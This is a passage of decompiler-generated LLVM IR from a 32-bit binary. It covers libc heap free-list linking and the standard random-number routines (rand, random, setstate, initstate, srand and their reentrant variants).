  store i32 %v3_1000b054, i32* @r31, align 4
  %v5_1000b088 = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v3_1000b054, i32 %v0_1000b038.lcssa, i32 %v2_1000afd8)
  store i32 %v5_1000b088, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b0a8

dec_label_pc_1000b090:                            ; preds = %dec_label_pc_1000b060, %dec_label_pc_1000b054
  %v2_1000b090 = add i32 %v0_1000b044.lcssa, %arg3
  store i32 %v2_1000b090, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268480680, i32* @lr, align 4
  %v5_1000b0a4 = call i32 @__heap_link_free_area(i32* %arg1, i32 %v2_1000b090, i32 %v0_1000b038.lcssa, i32 %v3_1000b054)
  store i32 %v5_1000b0a4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b0a8

dec_label_pc_1000b0a8:                            ; preds = %dec_label_pc_1000b02c, %dec_label_pc_1000b024, %dec_label_pc_1000b074, %dec_label_pc_1000b038, %dec_label_pc_1000b090
  %v0_1000b0a8 = load i32, i32* @r31, align 4
  store i32 %v0_1000b0a8, i32* @r30, align 4
  %v0_1000b0ac = load i32, i32* @r29, align 4
  %v2_1000b0ac = inttoptr i32 %v0_1000b0a8 to i32*
  store i32 %v0_1000b0ac, i32* %v2_1000b0ac, align 4
  br label %dec_label_pc_1000b0d0

dec_label_pc_1000b0b4:                            ; preds = %dec_label_pc_1000b004, %dec_label_pc_1000affc
  %v2_1000b0b4 = add i32 %v2_1000afd8, -12
  %v3_1000b0b4 = inttoptr i32 %v2_1000b0b4 to i32*
  store i32 %arg3, i32* %v3_1000b0b4, align 4
  %v0_1000b0b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000b0b8 = add i32 %v0_1000b0b8, -12
  store i32 %v1_1000b0b8, i32* @r30, align 4
  %v0_1000b0bc = load i32, i32* %r11.global-to-local, align 4
  %v0_1000b0c0 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_1000b0c0, i32* %r3.global-to-local, align 4
  %v0_1000b0c4 = load i32, i32* @r31, align 4
  store i32 268480720, i32* @lr, align 4
  %v4_1000b0cc = inttoptr i32 %v0_1000b0c0 to i32*
  %v5_1000b0cc = call i32 @__heap_link_free_area(i32* %v4_1000b0cc, i32 %v1_1000b0b8, i32 %v0_1000b0bc, i32 %v0_1000b0c4)
  store i32 %v5_1000b0cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b0d0

dec_label_pc_1000b0d0:                            ; preds = %dec_label_pc_1000b0a8, %dec_label_pc_1000b0b4
  %v0_1000b0d4 = load i32, i32* @r30, align 4
  store i32 %v0_1000b0d4, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000b0d4

; uselistorder directives
  uselistorder i32 %v3_1000b054, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_1000b00c, { 1, 0 }
  uselistorder i32 %v0_1000b044.lcssa, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_1000b038.lcssa, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v3_1000afe8, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_1000afd8, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 8, 2, 6, 9, 3, 10, 4, 11, 5, 7, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2 }
  uselistorder i32 -12, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32* %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000b0d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000b0a8, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000afe4, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_1000b0e8 = call i32 @random()
  ret i32 %v0_1000b0e8

; uselistorder directives
  uselistorder i32 ()* @random, { 9, 8, 0, 1, 2, 3, 4, 5, 6, 7 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_1000b100 = ptrtoint i32* %stack_var_-52 to i32
  store i32 ptrtoint (i32* @global_var_1001fc68.213 to i32), i32* @r29, align 4
  store i32 %v2_1000b100, i32* @r3, align 4
  %v0_1000b118 = call i32 @__pthread_return_void()
  %v0_1000b120 = call i32 @__pthread_return_0()
  %v2_1000b128 = ptrtoint i32* %stack_var_-56 to i32
  %v3_1000b130 = call i32 @__GI_random_r(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10020000.2 to i32), i32 -896) to i32*), i32 %v2_1000b128)
  store i32 %v2_1000b100, i32* @r3, align 4
  %v0_1000b13c = call i32 @__pthread_return_void()
  %v3_1000b144 = load i32, i32* %stack_var_-56, align 4
  ret i32 %v3_1000b144
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1001fc68.213 to i32), i32* %r29.global-to-local, align 4
  %v2_1000b17c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000b17c, i32* @r3, align 4
  %v0_1000b184 = call i32 @__pthread_return_void()
  %v0_1000b18c = call i32 @__pthread_return_0()
  store i32 268480936, i32* @lr, align 4
  %v3_1000b1a4 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_1001fc80)
  store i32 0, i32* %r29.global-to-local, align 4
  %v1_1000b1ac = icmp slt i32 %v3_1000b1a4, 0
  store i32 %v2_1000b17c, i32* @r3, align 4
  br i1 %v1_1000b1ac, label %dec_label_pc_1000b1c0, label %dec_label_pc_1000b1bc

dec_label_pc_1000b1bc:                            ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1001fc84.217 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000b1c0

dec_label_pc_1000b1c0:                            ; preds = %entry, %dec_label_pc_1000b1bc
  %v0_1000b1c0 = call i32 @__pthread_return_void()
  %v0_1000b1c8 = load i32, i32* %r29.global-to-local, align 4
  ret i32 %v0_1000b1c8

; uselistorder directives
  uselistorder i32* %r29.global-to-local, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_1000b1c0, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %v2_1000b1ec = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000b1ec, i32* @r3, align 4
  %v0_1000b214 = call i32 @__pthread_return_void()
  %v0_1000b21c = call i32 @__pthread_return_0()
  store i32 %arg1, i32* @r3, align 4
  store i32 268481084, i32* @lr, align 4
  %v4_1000b238 = inttoptr i32 %arg1 to i32*
  %v5_1000b238 = call i32 @__GI_initstate_r(i32* %v4_1000b238, i32 %arg2, i32 %arg3, i32 ptrtoint (i32* @global_var_1001fc80 to i32))
  store i32 %v2_1000b1ec, i32* @r3, align 4
  %v0_1000b244 = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_1001fc84.217 to i32)

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1000b278 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000b278, i32* @r3, align 4
  %v0_1000b294 = call i32 @__pthread_return_void()
  %v0_1000b29c = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_1001fc80 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 268481200, i32* @lr, align 4
  %v0_1000b2ac = call i32 @srandom_r()
  store i32 %v2_1000b278, i32* @r3, align 4
  %v0_1000b2b8 = call i32 @__pthread_return_void()
  ret i32 %v0_1000b2b8

; uselistorder directives
  uselistorder i32* @global_var_1001fc80, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1001fc80 to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_1000b2d0 = add i32 %tmp, 12
  %v2_1000b2d0 = inttoptr i32 %v1_1000b2d0 to i32*
  %v3_1000b2d0 = load i32, i32* %v2_1000b2d0, align 4
  store i32 %v3_1000b2d0, i32* %r11.global-to-local, align 4
  %v0_1000b2d4 = load i32, i32* @lr, align 4
  store i32 %v0_1000b2d4, i32* %r0.global-to-local, align 4
  %v1_1000b2dc = add i32 %arg1, 4
  store i32 %v1_1000b2dc, i32* %r3.global-to-local, align 4
  %v3_1000b2e0 = icmp eq i32 %v3_1000b2d0, 0
  %v1_1000b2e4 = add i32 %tmp, 8
  %v2_1000b2e4 = inttoptr i32 %v1_1000b2e4 to i32*
  %v3_1000b2e4 = load i32, i32* %v2_1000b2e4, align 4
  store i32 %v3_1000b2e4, i32* %r9.global-to-local, align 4
  br i1 %v3_1000b2e0, label %dec_label_pc_1000b2f0, label %dec_label_pc_1000b2f8

dec_label_pc_1000b2f0:                            ; preds = %entry
  %v2_1000b2f0 = add i32 %v3_1000b2e4, -4
  %v3_1000b2f0 = inttoptr i32 %v2_1000b2f0 to i32*
  store i32 0, i32* %v3_1000b2f0, align 4
  br label %dec_label_pc_1000b310

dec_label_pc_1000b2f8:                            ; preds = %entry
  %v1_1000b2f8 = add i32 %tmp, 4
  %v2_1000b2f8 = inttoptr i32 %v1_1000b2f8 to i32*
  %v3_1000b2f8 = load i32, i32* %v2_1000b2f8, align 4
  %v2_1000b2fc = sub i32 %v3_1000b2f8, %v3_1000b2e4
  %v4_1000b300 = sdiv i32 %v2_1000b2fc, 4
  %v1_1000b304 = mul i32 %v4_1000b300, 5
  %v2_1000b308 = add i32 %v1_1000b304, %v3_1000b2d0
  store i32 %v2_1000b308, i32* %r0.global-to-local, align 4
  %v2_1000b30c = add i32 %v3_1000b2e4, -4
  %v3_1000b30c = inttoptr i32 %v2_1000b30c to i32*
  store i32 %v2_1000b308, i32* %v3_1000b30c, align 4
  br label %dec_label_pc_1000b310

dec_label_pc_1000b310:                            ; preds = %dec_label_pc_1000b2f0, %dec_label_pc_1000b2f8
  %v0_1000b310 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000b310 = add i32 %v0_1000b310, -4
  %v2_1000b310 = inttoptr i32 %v1_1000b310 to i32*
  %v3_1000b310 = load i32, i32* %v2_1000b310, align 4
  store i32 5, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000f6c4.218 to i32), i32* %r9.global-to-local, align 4
  %v2_1000b320 = srem i32 %v3_1000b310, 5
  store i32 %v2_1000b320, i32* %r11.global-to-local, align 4
  %v2_1000b330 = icmp ugt i32 %v2_1000b320, 4
  %v1_1000b334 = mul nsw i32 %v2_1000b320, 4
  store i32 %v1_1000b334, i32* %r0.global-to-local, align 4
  %v2_1000b33c = add i32 %v1_1000b334, ptrtoint (i32* @global_var_1000f6c4.218 to i32)
  store i32 %v2_1000b33c, i32* %r10.global-to-local, align 4
  br i1 %v2_1000b330, label %dec_label_pc_1000b3a0, label %dec_label_pc_1000b344

dec_label_pc_1000b344:                            ; preds = %dec_label_pc_1000b310
  %v3_1000b338 = icmp eq i32 %v2_1000b320, 0
  %v1_1000b344 = add i32 %v1_1000b334, add (i32 ptrtoint (i32* @global_var_1000f6c4.218 to i32), i32 20)
  %v2_1000b344 = inttoptr i32 %v1_1000b344 to i32*
  %v3_1000b344 = load i32, i32* %v2_1000b344, align 4
  store i32 %v3_1000b344, i32* %r10.global-to-local, align 4
  %v3_1000b348 = inttoptr i32 %v2_1000b33c to i32*
  %v4_1000b348 = load i32, i32* %v3_1000b348, align 4
  store i32 %v4_1000b348, i32* %r9.global-to-local, align 4
  %v1_1000b34c = mul i32 %v3_1000b344, 4
  store i32 %v1_1000b34c, i32* %r0.global-to-local, align 4
  %v2_1000b350 = add i32 %tmp, 16
  %v3_1000b350 = inttoptr i32 %v2_1000b350 to i32*
  store i32 %v3_1000b344, i32* %v3_1000b350, align 4
  %v0_1000b354 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b354 = add i32 %tmp, 20
  %v3_1000b354 = inttoptr i32 %v2_1000b354 to i32*
  store i32 %v0_1000b354, i32* %v3_1000b354, align 4
  %v0_1000b358 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000b358 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000b358 = add i32 %v1_1000b358, %v0_1000b358
  store i32 %v2_1000b358, i32* %r8.global-to-local, align 4
  %v0_1000b35c = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000b35c, i32* %v2_1000b2d0, align 4
  br i1 %v3_1000b338, label %dec_label_pc_1000b394, label %dec_label_pc_1000b364

dec_label_pc_1000b364:                            ; preds = %dec_label_pc_1000b344
  %v0_1000b364 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000b364 = add i32 %v0_1000b364, -4
  %v2_1000b364 = inttoptr i32 %v1_1000b364 to i32*
  %v3_1000b364 = load i32, i32* %v2_1000b364, align 4
  %v1_1000b368 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000b368 = sdiv i32 %v3_1000b364, %v1_1000b368
  %v1_1000b36c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b36c = add i32 %v1_1000b36c, %v2_1000b368
  store i32 %v2_1000b36c, i32* %r9.global-to-local, align 4
  %v1_1000b370 = mul i32 %v2_1000b368, 4
  %v1_1000b374 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000b374 = sdiv i32 %v2_1000b36c, %v1_1000b374
  store i32 %v2_1000b374, i32* %r11.global-to-local, align 4
  %v2_1000b378 = add i32 %v1_1000b370, %v0_1000b364
  store i32 %v2_1000b378, i32* %r0.global-to-local, align 4
  %v2_1000b37c = add i32 %tmp, 4
  %v3_1000b37c = inttoptr i32 %v2_1000b37c to i32*
  store i32 %v2_1000b378, i32* %v3_1000b37c, align 4
  %v0_1000b380 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b380 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000b380 = mul i32 %v1_1000b380, %v0_1000b380
  store i32 %v2_1000b380, i32* %r11.global-to-local, align 4
  %v1_1000b384 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b384 = sub i32 %v1_1000b384, %v2_1000b380
  %v1_1000b388 = mul i32 %v2_1000b384, 4
  %v0_1000b38c = load i32, i32* %r3.global-to-local, align 4
  %v2_1000b38c = add i32 %v1_1000b388, %v0_1000b38c
  store i32 %v2_1000b38c, i32* %r9.global-to-local, align 4
  store i32 %v2_1000b38c, i32* %arg2, align 4
  br label %dec_label_pc_1000b394

dec_label_pc_1000b394:                            ; preds = %dec_label_pc_1000b344, %dec_label_pc_1000b364
  %v0_1000b394 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000b394 = add i32 %tmp, 24
  %v3_1000b394 = inttoptr i32 %v2_1000b394 to i32*
  store i32 %v0_1000b394, i32* %v3_1000b394, align 4
  %v0_1000b398 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1000b398, i32* %v2_1000b2e4, align 4
  %v0_1000b3b4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000b3b0

dec_label_pc_1000b3a0:                            ; preds = %dec_label_pc_1000b310
  %v0_1000b3a0 = call i32 @__errno_location()
  store i32 %v0_1000b3a0, i32* %r3.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1000b3a8 = inttoptr i32 %v0_1000b3a0 to i32*
  store i32 22, i32* %v2_1000b3a8, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000b3b0

dec_label_pc_1000b3b0:                            ; preds = %dec_label_pc_1000b394, %dec_label_pc_1000b3a0
  %v0_1000b3b4 = phi i32 [ %v0_1000b3b4.pre, %dec_label_pc_1000b394 ], [ -1, %dec_label_pc_1000b3a0 ]
  store i32 %v0_1000b2d4, i32* %r0.global-to-local, align 4
  store i32 %v0_1000b3b4, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000b3b4

; uselistorder directives
  uselistorder i32 %v0_1000b3b4, { 1, 0 }
  uselistorder i32 %v3_1000b344, { 1, 0, 2 }
  uselistorder i32 %v1_1000b334, { 2, 1, 0 }
  uselistorder i32 %v2_1000b320, { 3, 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 5, 6, 3, 4, 1, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 0 }
  uselistorder label %dec_label_pc_1000b3b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000b394, { 1, 0 }
  uselistorder label %dec_label_pc_1000b310, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_1000b3c4 = add i32 %tmp, 12
  %v2_1000b3c4 = inttoptr i32 %v1_1000b3c4 to i32*
  %v3_1000b3c4 = load i32, i32* %v2_1000b3c4, align 4
  %v1_1000b3d0 = add i32 %tmp, 8
  %v2_1000b3d0 = inttoptr i32 %v1_1000b3d0 to i32*
  %v3_1000b3d0 = load i32, i32* %v2_1000b3d0, align 4
  store i32 %v3_1000b3d0, i32* %r7.global-to-local, align 4
  %v3_1000b3d4 = icmp eq i32 %v3_1000b3c4, 0
  br i1 %v3_1000b3d4, label %dec_label_pc_1000b3dc, label %dec_label_pc_1000b3f8

dec_label_pc_1000b3dc:                            ; preds = %entry
  %v1_1000b3dc = inttoptr i32 %v3_1000b3d0 to i32*
  %v2_1000b3dc = load i32, i32* %v1_1000b3dc, align 4
  %v2_1000b3e0 = mul i32 %v2_1000b3dc, 1103515245
  %v1_1000b3e4 = add i32 %v2_1000b3e0, 12345
  %v1_1000b3e8 = urem i32 %v1_1000b3e4, -2147483648
  store i32 %v1_1000b3e8, i32* %r9.global-to-local, align 4
  store i32 %v1_1000b3e8, i32* %v1_1000b3dc, align 4
  %v0_1000b3f0 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b3f0 = inttoptr i32 %arg2 to i32*
  store i32 %v0_1000b3f0, i32* %v2_1000b3f0, align 4
  br label %dec_label_pc_1000b44c

dec_label_pc_1000b3f8:                            ; preds = %entry
  %v2_1000b3f8 = load i32, i32* %arg1, align 4
  %v1_1000b3fc = add i32 %tmp, 4
  %v2_1000b3fc = inttoptr i32 %v1_1000b3fc to i32*
  %v3_1000b3fc = load i32, i32* %v2_1000b3fc, align 4
  store i32 %v3_1000b3fc, i32* %r9.global-to-local, align 4
  %v1_1000b400 = add i32 %tmp, 24
  %v2_1000b400 = inttoptr i32 %v1_1000b400 to i32*
  %v3_1000b400 = load i32, i32* %v2_1000b400, align 4
  %v1_1000b404 = add i32 %v2_1000b3f8, 4
  store i32 %v1_1000b404, i32* %r8.global-to-local, align 4
  %v1_1000b408 = add i32 %v3_1000b3fc, 4
  %v1_1000b40c = inttoptr i32 %v3_1000b3fc to i32*
  %v2_1000b40c = load i32, i32* %v1_1000b40c, align 4
  store i32 %v2_1000b40c, i32* %r9.global-to-local, align 4
  %v2_1000b410 = icmp ult i32 %v1_1000b404, %v3_1000b400
  %v1_1000b418 = inttoptr i32 %v2_1000b3f8 to i32*
  %v2_1000b418 = load i32, i32* %v1_1000b418, align 4
  store i32 %v1_1000b408, i32* %r10.global-to-local, align 4
  %v2_1000b420 = add i32 %v2_1000b418, %v2_1000b40c
  %v1_1000b424 = udiv i32 %v2_1000b420, 2
  store i32 %v1_1000b424, i32* %r9.global-to-local, align 4
  store i32 %v2_1000b420, i32* %v1_1000b418, align 4
  %v0_1000b42c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b42c = inttoptr i32 %arg2 to i32*
  store i32 %v0_1000b42c, i32* %v2_1000b42c, align 4
  br i1 %v2_1000b410, label %dec_label_pc_1000b43c, label %dec_label_pc_1000b434

dec_label_pc_1000b434:                            ; preds = %dec_label_pc_1000b3f8
  %v0_1000b434 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1000b434, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000b444

dec_label_pc_1000b43c:                            ; preds = %dec_label_pc_1000b3f8
  %v2_1000b414 = icmp ult i32 %v1_1000b408, %v3_1000b400
  br i1 %v2_1000b414, label %dec_label_pc_1000b444, label %dec_label_pc_1000b440

dec_label_pc_1000b440:                            ; preds = %dec_label_pc_1000b43c
  %v0_1000b440 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1000b440, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000b444

dec_label_pc_1000b444:                            ; preds = %dec_label_pc_1000b43c, %dec_label_pc_1000b434, %dec_label_pc_1000b440
  %v0_1000b444 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_1000b444, i32* %v2_1000b3fc, align 4
  %v0_1000b448 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1000b448, i32* %arg1, align 4
  br label %dec_label_pc_1000b44c

dec_label_pc_1000b44c:                            ; preds = %dec_label_pc_1000b3dc, %dec_label_pc_1000b444
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1000b420, { 1, 0 }
  uselistorder i32 %v1_1000b408, { 1, 0 }
  uselistorder i32 %v3_1000b3fc, { 1, 0, 2 }
  uselistorder i32 %v1_1000b3e8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1000b44c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b444, { 2, 0, 1 }
}

define i32 @srandom_r() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000b454 = load i32, i32* @lr, align 4
  %v0_1000b460 = load i32, i32* @r4, align 4
  store i32 %v0_1000b460, i32* @r30, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_1000b46c = add i32 %v0_1000b460, 12
  %v2_1000b46c = inttoptr i32 %v1_1000b46c to i32*
  %v3_1000b46c = load i32, i32* %v2_1000b46c, align 4
  %v2_1000b470 = icmp ugt i32 %v3_1000b46c, 4
  br i1 %v2_1000b470, label %dec_label_pc_1000b520, label %dec_label_pc_1000b478

dec_label_pc_1000b478:                            ; preds = %entry
  %v0_1000b478 = load i32, i32* @r3, align 4
  %v3_1000b478 = icmp eq i32 %v0_1000b478, 0
  %v1_1000b47c = add i32 %v0_1000b460, 8
  %v2_1000b47c = inttoptr i32 %v1_1000b47c to i32*
  %v3_1000b47c = load i32, i32* %v2_1000b47c, align 4
  store i32 %v3_1000b47c, i32* %r10.global-to-local, align 4
  br i1 %v3_1000b478, label %dec_label_pc_1000b484, label %dec_label_pc_1000b488

dec_label_pc_1000b484:                            ; preds = %dec_label_pc_1000b478
  store i32 1, i32* @r3, align 4
  br label %dec_label_pc_1000b488

dec_label_pc_1000b488:                            ; preds = %dec_label_pc_1000b478, %dec_label_pc_1000b484
  %v0_1000b48c = phi i32 [ %v0_1000b478, %dec_label_pc_1000b478 ], [ 1, %dec_label_pc_1000b484 ]
  %v3_1000b488 = icmp eq i32 %v3_1000b46c, 0
  %v2_1000b48c = inttoptr i32 %v3_1000b47c to i32*
  store i32 %v0_1000b48c, i32* %v2_1000b48c, align 4
  br i1 %v3_1000b488, label %dec_label_pc_1000b51c, label %dec_label_pc_1000b494

dec_label_pc_1000b494:                            ; preds = %dec_label_pc_1000b488
  %v0_1000b494 = load i32, i32* @r30, align 4
  %v1_1000b494 = add i32 %v0_1000b494, 16
  %v2_1000b494 = inttoptr i32 %v1_1000b494 to i32*
  %v3_1000b494 = load i32, i32* %v2_1000b494, align 4
  store i32 %v3_1000b494, i32* %r11.global-to-local, align 4
  store i32 127773, i32* %r8.global-to-local, align 4
  store i32 2147483647, i32* %r7.global-to-local, align 4
  %v0_1000b4ac = load i32, i32* %r10.global-to-local, align 4
  store i32 %v3_1000b494, i32* %ctr.global-to-local, align 4
  %tmp18 = icmp sgt i32 %v3_1000b494, 0
  br i1 %tmp18, label %dec_label_pc_1000b4e8.preheader, label %dec_label_pc_1000b4e8.preheader.thread

dec_label_pc_1000b4e8.preheader.thread:           ; preds = %dec_label_pc_1000b494
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000b4ec

dec_label_pc_1000b4e8.preheader:                  ; preds = %dec_label_pc_1000b494
  %v1_1000b4e82 = add i32 %v3_1000b494, -1
  store i32 %v1_1000b4e82, i32* %ctr.global-to-local, align 4
  %v2_1000b4e83 = icmp eq i32 %v1_1000b4e82, 0
  br i1 %v2_1000b4e83, label %dec_label_pc_1000b4ec, label %dec_label_pc_1000b4c4

dec_label_pc_1000b4c4:                            ; preds = %dec_label_pc_1000b4e8.preheader, %dec_label_pc_1000b4e4.dec_label_pc_1000b4c4_crit_edge
  %v1_1000b4e4 = phi i32 [ %v2_1000b4e4, %dec_label_pc_1000b4e4.dec_label_pc_1000b4c4_crit_edge ], [ %v0_1000b4ac, %dec_label_pc_1000b4e8.preheader ]
  %v1_1000b4c4 = phi i32 [ %v1_1000b4c4.pre, %dec_label_pc_1000b4e4.dec_label_pc_1000b4c4_crit_edge ], [ 127773, %dec_label_pc_1000b4e8.preheader ]
  %v0_1000b4c4 = load i32, i32* @r3, align 4
  %v2_1000b4c4 = sdiv i32 %v0_1000b4c4, %v1_1000b4c4
  %v2_1000b4c8 = mul i32 %v2_1000b4c4, %v1_1000b4c4
  %v2_1000b4cc = sub i32 %v0_1000b4c4, %v2_1000b4c8
  %v1_1000b4d0 = mul i32 %v2_1000b4c4, 2836
  store i32 %v1_1000b4d0, i32* %r0.global-to-local, align 4
  %v1_1000b4d4 = mul i32 %v2_1000b4cc, 16807
  %v2_1000b4d8 = sub i32 %v1_1000b4d4, %v1_1000b4d0
  store i32 %v2_1000b4d8, i32* @r3, align 4
  %tmp19 = icmp sgt i32 %v2_1000b4d8, -1
  br i1 %tmp19, label %dec_label_pc_1000b4e4, label %dec_label_pc_1000b4e0

dec_label_pc_1000b4e0:                            ; preds = %dec_label_pc_1000b4c4
  %v1_1000b4e0 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000b4e0 = add i32 %v1_1000b4e0, %v2_1000b4d8
  store i32 %v2_1000b4e0, i32* @r3, align 4
  br label %dec_label_pc_1000b4e4

dec_label_pc_1000b4e4:                            ; preds = %dec_label_pc_1000b4c4, %dec_label_pc_1000b4e0
  %v0_1000b4e4 = phi i32 [ %v2_1000b4d8, %dec_label_pc_1000b4c4 ], [ %v2_1000b4e0, %dec_label_pc_1000b4e0 ]
  %v2_1000b4e4 = add i32 %v1_1000b4e4, 4
  %v3_1000b4e4 = inttoptr i32 %v2_1000b4e4 to i32*
  store i32 %v0_1000b4e4, i32* %v3_1000b4e4, align 4
  %v0_1000b4e8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b4e8 = add i32 %v0_1000b4e8, -1
  store i32 %v1_1000b4e8, i32* %ctr.global-to-local, align 4
  %v2_1000b4e8 = icmp eq i32 %v1_1000b4e8, 0
  br i1 %v2_1000b4e8, label %dec_label_pc_1000b4e8.dec_label_pc_1000b4ec_crit_edge, label %dec_label_pc_1000b4e4.dec_label_pc_1000b4c4_crit_edge

dec_label_pc_1000b4e4.dec_label_pc_1000b4c4_crit_edge: ; preds = %dec_label_pc_1000b4e4
  %v1_1000b4c4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000b4c4

dec_label_pc_1000b4e8.dec_label_pc_1000b4ec_crit_edge: ; preds = %dec_label_pc_1000b4e4
  %v0_1000b4ec.pre = load i32, i32* @r30, align 4
  %v0_1000b4f0.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000b4f4.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000b4ec

dec_label_pc_1000b4ec:                            ; preds = %dec_label_pc_1000b4e8.preheader.thread, %dec_label_pc_1000b4e8.dec_label_pc_1000b4ec_crit_edge, %dec_label_pc_1000b4e8.preheader
  %v0_1000b4f4 = phi i32 [ %v0_1000b4f4.pre, %dec_label_pc_1000b4e8.dec_label_pc_1000b4ec_crit_edge ], [ %v0_1000b4ac, %dec_label_pc_1000b4e8.preheader ], [ %v0_1000b4ac, %dec_label_pc_1000b4e8.preheader.thread ]
